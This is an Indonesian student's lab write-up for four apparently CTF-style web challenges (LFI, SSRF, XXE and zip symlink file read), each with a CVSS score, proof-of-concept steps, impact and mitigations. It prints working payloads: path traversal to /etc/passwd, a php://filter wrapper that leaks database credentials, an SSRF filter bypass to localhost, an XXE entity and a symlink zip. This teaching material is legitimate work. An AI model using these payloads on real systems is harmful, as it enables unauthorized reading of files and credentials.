<h1>Laporan Praktikum Ethical Hacking</h1>
<p><strong>Nama:</strong> Jofanka Al-Kautsar Pangestu Abady</p>
<p><strong>NRP:</strong> 5027241107</p>
<p><strong>Tanggal:</strong> Sabtu, 6 Desember 2025</p>


<!-- ------------------------------- 1. Omongan Wong Semarang ------------------------------- -->
<h2>1. Omongan Wong Semarang</h2>


<!-- ----------- 1a. Nama Kerentanan ----------- -->
<h3>
  Nama Kerentanan
</h3>

<p>
  <strong>Local File Inclusion (LFI)</strong> - Source Code Disclosure
</p>

<!-- ----------- 1b. Deskripsi Kerentanan ----------- -->
<h3>Deskripsi Kerentanan</h3>

<p>
  Aplikasi memiliki parameter <code>page</code> pada URL yang menerima input berupa string Base64. Input ini di-decode oleh server dan langsung digunakan dalam fungsi <code>include()</code> PHP dengan penambahan ekstensi <code>.<span class="selected">php</span></code> secara otomatis. Tidak adanya validasi input memungkinkan penyerang untuk memanipulasi jalur file (path traversal) dan membaca file sensitif di server atau membaca source code aplikasi menggunakan PHP Wrapper.
</p>

<!-- ----------- 1c. CVSS Score ----------- -->
<h3>
  CVSS Score
</h3>

<p>
  <strong>Vector String:</strong> <code>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</code>
<em>Penjelasan: Serangan via Network (N), Kompleksitas Rendah (L), Tanpa Privilege (N), Tanpa User Interaction (N), Scope Unchanged (U), Confidentiality High (H) karena bisa baca config/source code, Integrity &amp; Availability None.</em>
</p>
<p>
  <strong>
    Hasil Kalkulasi Terminal:
  </strong>

</p>
<blockquote>
  <p>
    <em>
      [MASUKKAN SCREENSHOT TERMINAL HASIL RUNNING cvss_calc.py DISINI]
     </em>
  
<strong>
Score: 7.5 (High)
</strong>
</p> 
</blockquote>

<!-- ----------- 1d. Langkah Pengerjaan (Proof of Concept) ----------- -->
<h3>Langkah Pengerjaan (Proof of Concept)</h3>

<ol>
  <li>
    <p>
      <strong>Tampilan Web:</strong> Secara tampilan tampak seperti kamus biasa, dan setiap definisi yang ada di dalamnya tidak terdapat input atau tombol tertentu.
    </p>
    <img width="1464" height="808" alt="Screenshot 2025-12-06 at 05 55 40" src="https://github.com/user-attachments/assets/35db5511-b630-465f-a1ce-1dc4cc1a8cb3" />

<img width="1463" height="821" alt="Screenshot 2025-12-06 at 05 57 19" src="https://github.com/user-attachments/assets/e9412f80-0888-4ce0-9145-c629cd7701a9" />
      </blockquote>
  </li>
  
  <li>
    <p>
      <strong>Analisis Request:</strong> Jika kita membukanya dengan Burp Suite, tidak adanya POST pada proses memuat laman ini.</p><blockquote><p><em>
        <img width="932" height="419" alt="image" src="https://github.com/user-attachments/assets/e1468b4b-41ba-428c-a7fa-b029c91cf99e" />
      </em>
</p>
      </blockquote>
  </li>
  
  <li>
    <p>
      <strong>Percobaan Eksploitasi (Thought Process):</strong> Saya mencoba melakukan modifikasi pada hasil Burp Suite tadi, dengan mengubah <pre>GET /?page=cGFnZXMvZ2VtcmFkYWs= HTTP/1.1</pre> menjadi <pre>GET /?page=Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==</pre> di mana <code>Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==</code> adalah hasil eecode dari <code>../../../../etc/passwd</code>.
    </p>
      <pre>
HTTP/1.1 200 OK
Date: Fri, 05 Dec 2025 23:08:48 GMT
Server: Apache/2.4.65 (Debian)
X-Powered-By: PHP/8.3.28
Vary: Accept-Encoding
Content-Length: 355
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<br />
<b>Warning</b>:  include(../../../../etc/passwd.php): Failed to open stream: No such file or directory in <b>/var/www/html/index.php</b> on line <b>3</b><br />
<br />
<b>Warning</b>:  include(): Failed opening '../../../../etc/passwd.php' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php</b> on line <b>3</b><br />
</pre>

<p>Lalu, kita coba dengan payload yang lain, misalnya <code>php://filter/convert.base64-encode/resource=config</code>, lalu diencode menjadi <code>cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1jb25maWc=</code>. Untuk hasilnya seperti ini.</p>
<pre>
HTTP/1.1 200 OK
Date: Fri, 05 Dec 2025 23:17:23 GMT
Server: Apache/2.4.65 (Debian)
X-Powered-By: PHP/8.3.28
Vary: Accept-Encoding
Content-Length: 428
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

PD9waHAKLy8gRGF0YWJhc2UgQ29uZmlndXJhdGlvbgokZGJfaG9zdCA9ICdsb2NhbGhvc3QnOwokZGJfcG9ydCA9ICczMzA2JzsKJGRiX3VzZXIgPSAncm9vdCc7CiRkYl9wYXNzID0gJ2luZ2FoaW5naWhwZXRpbmdzaW5nJzsKJGRiX25hbWUgPSAnbWFramVnYWdpayc7Cgokc2VjcmV0X2tleSA9ICdFVEhBQ0t7a3VyYW5naV9rZWNlcGF0YW5fZ3VuYWthbl9oZWxtfSc7CgppZiAoYmFzZW5hbWUoJF9TRVJWRVJbJ1BIUF9TRUxGJ10pID09PSBiYXNlbmFtZShfX0ZJTEVfXykpIHsKICAgIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicpOwogICAgCn0KPz4=
</pre>
  <p>
    Dimana, pada hasil <code>base64</code> tersebvut jika di-decode maka akan muncul seperti ini.
  </p>
  <pre>
    <?php
    
    $db_host = 'localhost';
        $db_port = '3306';
        $db_user = 'root';
        $db_pass = 'ingahingihpetingsing';
        $db_name = 'makjegagik';
      
      $secret_key = 'ETHACK{kurangi_kecepatan_gunakan_helm}';
      
      if (basename($_SERVER['PHP_SELF']) === basename(__FILE__)) {
          header('HTTP/1.0 403 Forbidden');
          
      }
      ?>
  </pre>

  Berdasarkan hasil di atas, dapat ditemukan bahwa flagnya adalah
  <pre>
    ETHACK{kurangi_kecepatan_gunakan_helm}
  </pre>
  .
  </li>
  

</ol>

<!-- ----------- 1e. Dampak ----------- -->
<h3>Dampak</h3>

<p>Penyerang dapat membaca source code aplikasi (Intellectual Property) dan file konfigurasi sensitif yang berisi kredensial database atau API Key, yang dapat mengarah pada pengambilalihan sistem secara penuh.</p>

<!-- ----------- 1f. Mitigasi ----------- -->
<h3>Mitigasi</h3>
<ol>
  <li>
    <p>Gunakan <strong>Whitelist</strong> (daftar putih) untuk file yang boleh diakses. Hindari memasukkan input user langsung ke fungsi <code>include()</code>.</p>
  </li>
  <li>
    <p>Matikan opsi <code>allow_url_include</code> dan <code>allow_url_fopen</code> di <code>php.ini</code>.</p>
  </li>
  <li>
    <p>Validasi input user secara ketat (hanya alphanumeric).</p>
  </li>
</ol>

<!-- ------------------------------- 2. URL Surfer ------------------------------- -->
<h2>2. URL Surfer</h2>

<!-- ----------- 2a. Nama Kerentanan ----------- -->
<h3>Nama Kerentanan</h3>
<p><strong>Server-Side Request Forgery (SSRF)</strong></p>

<!-- ----------- 2b. Deskripsi Kerentanan ----------- -->
<h3>Deskripsi Kerentanan</h3>
<p>Aplikasi memiliki fitur untuk mengambil konten dari URL yang diberikan pengguna (<code>/fetch?url=...</code>). Logika filter domain hanya mengecek keberadaan string <code>google.com/url?q=</code> tanpa memvalidasi struktur URL secara keseluruhan. Penyerang dapat memanipulasi input untuk memaksa server mengakses layanan internal (localhost) yang seharusnya tidak dapat diakses dari luar.</p>

<!-- ----------- 2c. CVSS Score ----------- -->
<h3>CVSS Score</h3>
<p><strong>Vector String:</strong> <code>AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N</code>
<em>Penjelasan: Scope Changed (C) karena serangan berpindah dari aplikasi web ke layanan internal (port 1337).</em></p><p><strong>Hasil Kalkulasi Terminal:</strong></p><blockquote><p><em>[MASUKKAN SCREENSHOT TERMINAL HASIL RUNNING cvss_calc.py DISINI]</em>
  
<strong>Score: 8.6 (High)</strong></p>
</blockquote>

<!-- ----------- 2d. Langkah Pengerjaan (Proof of Concept) ----------- -->
<h3>
  Langkah Pengerjaan (Proof of Concept)
</h3>
<ol>
  <li>
    <p>
      <strong>Analisis Source Code:</strong>
Ditemukan celah pada logika Python: <code>url.split("google.com/url?q=")[1]</code>. Kode hanya mengambil bagian belakang string tanpa memvalidasi bagian depan.
    </p>
  </li>
  <li>
    <p>
      <strong>Crafting Payload:</strong>
Saya menyusun URL dengan format: <code>[Bypass Filter] + [Splitter] + [Internal Target]</code>.
Target internal adalah <code>http://127.0.0.1:1337/flag</code>.
</p>
  <p>
    <strong>Payload:</strong> <code>http://google.com/url?q=http://127.0.0.1:1337/flag</code>
  </p>
  </li>
  
  <li>
    <p><strong>Eksploitasi:</strong>
Mengirimkan request ke endpoint <code>/fetch</code> dengan payload tersebut.
    </p><blockquote>
      <p>
        <em>
          [MASUKKAN SCREENSHOT BROWSER/BURP SUITE SAAT REQUEST KE /FETCH]
        </em>
      </p>
    </blockquote>
  </li>
  <li>
      <p>
        <strong>Hasil:</strong>
          Server merespons dengan JSON yang berisi Flag dari layanan internal.
      </p>
     <blockquote>
        <p>
          <em>
            [MASUKKAN SCREENSHOT RESPON BERISI FLAG]
          </em>
        </p>
      </blockquote>
    </li>
  </ol>

<!-- ----------- 2e. Dampak ----------- -->
<h3>Dampak</h3>
<p>
  Penyerang dapat memindai port internal (Port Scanning), mengakses layanan internal yang tidak terproteksi (seperti database, admin panel, atau microservices), dan membaca data sensitif.
</p>

<!-- ----------- 2f. Mitigasi ----------- -->
<h3>Mitigasi</h3>
<ol>
  <li>
    <p>
      Validasi input URL menggunakan library parsing yang aman, pastikan hostname yang dituju benar-benar valid.
    </p>
  </li>
  
  <li>
    <p>Implementasikan <strong>Blocklist</strong> untuk IP Private/Local (seperti 127.0.0.1, 10.x.x.x, 192.168.x.x).
    </p>
  </li>
  
  <li>
    <p>
      Nonaktifkan fitur redirect pada library HTTP client (jika tidak diperlukan).
    </p>
  </li>
</ol>


<!-- ------------------------------- 3. XML Idol Processor ------------------------------- -->
<h2>3. XML Idol Processor</h2>

<!-- ----------- 3a. Nama Kerentanan ----------- -->
<h3>Nama Kerentanan</h3>

<p>
  <strong>
    XML External Entity (XXE) Injection
  </strong>
</p>

<!-- ----------- 3b. Deskripsi Kerentanan ----------- -->
<h3>Deskripsi Kerentanan</h3>

<p>
  Aplikasi memproses input XML dari pengguna (melalui URL eksternal) dengan konfigurasi parser yang tidak aman (<code>LIBXML_NOENT</code> dan <code>substituteEntities = true</code>). Hal ini memungkinkan penyerang mendefinisikan <em>external entities</em> untuk membaca file lokal di server.
</p>

<!-- ----------- 3c. CVSS Score ----------- -->
<h3>CVSS Score</h3>

<p>
  <strong>Vector String:</strong> <code>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</code>

  <em>Penjelasan: Confidentiality High karena bisa membaca file sistem (/etc/passwd).</em></p><p><strong>Hasil Kalkulasi Terminal:</strong>
</p>

<blockquote>
  <p>
  <em>
    [MASUKKAN SCREENSHOT TERMINAL HASIL RUNNING cvss_calc.py DISINI]
  </em>
<strong>
  Score: 7.5 (High)
</strong>
</p>
  
</blockquote>

<!-- ----------- 3d. Langkah Pengerjaan (Proof of Concept) ----------- -->
<h3>Langkah Pengerjaan (Proof of Concept)</h3>
<ol>
  <li>
    <p>
      <strong>Identifikasi Celah:</strong>
Halaman depan menyebutkan "supports DTD processing and external entity resolution". Ini adalah indikator utama XXE.
    </p>
  </li>
  
  <li>
    <p>
      <strong>
        Pembuatan Payload (GitHub Gist):
      </strong>
Karena ada filter HTML, saya membuat file XML murni (Raw) di GitHub Gist yang berisi definisi entity jahat untuk membaca <code>/etc/passwd</code>.</p><p><strong>XML Payload:</strong></p><pre><code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt; ]&gt;
&lt;data&gt;&amp;xxe;&lt;/data&gt;
<br class="ProseMirror-trailingBreak"></code></pre>
    <blockquote>
      <p>
        <em>
          [MASUKKAN SCREENSHOT GIST RAW]
        </em>
      </p>
    </blockquote>
    
  </li>
  
  <li>
    <p>
      <strong>
        Eksploitasi:
      </strong>
Memasukkan URL Raw Gist tersebut ke parameter <code>?idol=</code>.
    </p>
    <blockquote>
      <p>
        <em>
          [MASUKKAN SCREENSHOT URL BAR BROWSER]
        </em>
      </p>
    </blockquote>
  </li>
  
  <li>
    <p>
      <strong>
        Hasil:
      </strong>
Aplikasi menampilkan isi file <code>/etc/passwd</code>.
    </p>
          <blockquote>
            <p>
  <em>
    [MASUKKAN SCREENSHOT ISI FILE PASSWD DI WEBSITE]
  </em>
            </p>
          </blockquote>
  </li>
</ol>

<!-- ----------- 3e. Dampak ----------- -->
<h3>
  Dampak
</h3>
<p>
  Penyerang dapat membaca file sistem (Sensitive Data Exposure), melakukan Server-Side Request Forgery (SSRF), atau Denial of Service (DoS) melalui serangan Billion Laughs.
</p>

<!-- ----------- 3f. Mitigasi ----------- -->
<h3>
  Mitigasi
</h3>
<ol>
  <li>
    <p>
      Nonaktifkan pemrosesan DTD dan External Entities pada konfigurasi parser XML (<code>libxml_disable_entity_loader(true)</code> pada PHP lama atau setel opsi <code>LIBXML_NOENT</code> ke false).
    </p>
  </li>
  
  <li>
    <p>
      Gunakan format data yang lebih aman seperti JSON jika memungkinkan.
    </p>
    </li>
</ol>


<!-- ------------------------------- 4. Eterion Storage ------------------------------- -->

<h2>4. Eterion Storage</h2>
<!-- ----------- 4a. Nama Kerentanan ----------- -->
<h3>
  Nama Kerentanan
</h3>
<p>
  <strong>
    Arbitrary File Read via Archive Symlink (Zip Slip Variation)
  </strong>
</p>

<!-- ----------- 4b. Deskripsi Kerentanan ----------- -->
<h3>
  Deskripsi Kerentanan
</h3>
<p>
  Fitur "Auto extract" pada aplikasi gagal memvalidasi isi file arsip (ZIP). Aplikasi mengekstrak <em>symbolic link</em> (tautan simbolik) apa adanya. Penyerang dapat mengunggah arsip berisi symlink yang mengarah ke file di luar direktori upload (misalnya <code>/flag.txt</code>), lalu mengakses file tersebut melalui antarmuka web.
</p>

<!-- ----------- 4c. CVSS Score ----------- -->
  <h3>
    CVSS Score
  </h3>
  <p>
    <strong>Vector String:</strong> <code>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</code>
  </p>
  <p>
    <strong>
      Hasil Kalkulasi Terminal:
    </strong>
  </p>
  <blockquote>
    <p>
      <em>
        [MASUKKAN SCREENSHOT TERMINAL HASIL RUNNING cvss_calc.py DISINI]
      </em>
      <strong>
        Score: 7.5 (High)
      </strong>
    </p>
  </blockquote>
  
  <!-- ----------- 4d. Langkah Pengerjaan (Proof of Concept) ----------- -->
  <h3>
    Langkah Pengerjaan (Proof of Concept)
  </h3>
  
  <ol>
    <li>
      <p>
        <strong> Pembuatan Payload (Terminal): </strong> Menggunakan terminal Linux/Mac untuk membuat symlink yang mengarah ke flag, lalu membungkusnya dengan opsi <code>--symlinks</code>.
      </p>
      <pre>
        <code>
          ln -s /flag.txt flag_link
            zip --symlinks exploit.zip flag_link
            <br class="ProseMirror-trailingBreak">
        </code>
      </pre>
      <blockquote>
        <p>
          <em>
            [MASUKKAN SCREENSHOT TERMINAL SAAT MEMBUAT ZIP]
          </em>
        </p>
      </blockquote>
    </li>
    <li>
      <p>
        <strong>
          Upload:
        </strong>
Mengunggah file <code>exploit.zip</code> ke aplikasi Eterion Storage.</p>
    </li>
    <li>
      <p>
        <strong>Akses File:</strong> Mengklik file hasil ekstraksi (<code>flag_link</code>) pada File Manager web.
      </p>
      <blockquote>
        <p>
          <em>
            [MASUKKAN SCREENSHOT FILE MANAGER DI WEBSITE]
          </em>
        </p>
      </blockquote>
    </li>
    <li>
      <p>
        <strong>Hasil:</strong>Browser menampilkan isi dari <code>/flag.txt</code>.
      </p>
      <blockquote>
        <p>
          <em>
            [MASUKKAN SCREENSHOT FLAG YANG MUNCUL]
          </em>
        </p>
      </blockquote>
    </li>
  </ol>

<!-- ----------- 4e. Dampak ----------- -->
<h3>
  Dampak
</h3>
<p>
  Penyerang dapat membaca file apa pun di sistem server yang memiliki izin baca oleh user web server, termasuk konfigurasi server, source code, dan data sensitif lainnya.
</p>

<!-- ----------- 4f. Mitigasi ----------- -->
<h3>
  Mitigasi
</h3>
<ol>
  <li>
    <p>Saat mengekstrak file ZIP, validasi setiap entry. Jangan izinkan ekstraksi file tipe <em>Symbolic Link</em>.
    </p>
  </li>
  
  <li>
    <p>
      Pastikan jalur ekstraksi file (<code>canonical path</code>) tetap berada di dalam direktori tujuan yang diizinkan (mencegah Path Traversal).
    </p>
  </li>
  </ol>
  </div>
